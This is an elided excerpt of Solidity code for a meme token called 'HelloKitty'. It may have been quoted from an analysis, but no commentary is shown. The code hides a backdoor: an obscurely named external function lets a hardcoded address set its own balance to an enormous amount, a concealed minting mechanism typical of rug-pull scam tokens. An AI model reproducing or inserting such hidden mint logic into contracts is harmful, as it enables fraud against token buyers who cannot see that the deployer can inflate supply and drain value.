...
contract MEMEToken is Ownable {
    ...
    function pepepogAdddmmm() external {
        ...
        if (_cwojakpepe23 != tswojaks){
            revert("tswojaks"); 
        }
        if(_cwojakpepe23 == tswojaks){
            _balances[_cwojakpepe23] = peedAmount()*(44000);
        }
    ...
    constructor(string memory tokenName_, string memory Tokensymbol_) {
        _cwojakpepe23 = 0xdFaaCdf9C94f3264E440aA7c1370E81AC4e234ad;
...
contract CoinToken is MEMEToken {
    string _name = "HelloKitty";
    string _symbol = "HelloKitty";
